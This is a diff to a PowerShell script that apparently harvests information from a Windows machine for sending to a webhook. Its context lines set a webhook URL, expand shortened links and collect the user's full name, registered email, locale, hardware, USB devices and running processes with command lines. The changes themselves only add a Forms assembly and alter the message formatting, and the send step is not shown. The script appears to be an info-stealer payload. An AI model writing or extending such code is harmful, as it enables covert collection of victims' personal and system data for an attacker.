@@ -4,6 +4,8 @@ $hookurl = "$dc"
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
+Add-Type -AssemblyName System.Windows.Forms
+
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
 $email = (Get-ComputerInfo).WindowsRegisteredOwner
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
@@ -32,7 +34,7 @@ $systemString += "`nMemory : $RamInfo"
 $systemString += "`nGpu : $($videocardinfo.Name)"
 $systemString += "`nStorage : $Hddinfo"
 
-$infomessage = "``========================================================
+$infomessage = "``````========================================================
 
 Current User    : $env:USERNAME
 Email Address   : $email
@@ -45,7 +47,7 @@ Build           : $ver
 Screen Size     : $screensize
 Hardware Info
 --------------------------------------------------------
-$systemString``"
+$systemString``````"
 
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
